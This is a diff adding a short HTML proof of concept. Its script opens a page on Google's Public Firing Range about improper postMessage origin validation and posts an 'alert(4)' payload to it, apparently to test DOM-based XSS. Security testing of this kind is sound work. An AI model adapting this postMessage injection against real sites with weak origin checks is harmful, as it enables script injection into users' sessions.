@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      const win = window.open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/improperOriginValidationWithPartialStringComparison", "victim");
+
+      setTimeout(() => {
+        win.postMessage({
+          data: "alert(4)"
+        }, "https://www.google.com");
+      }, 1000);
+    </script>
+  </body>
+</html>
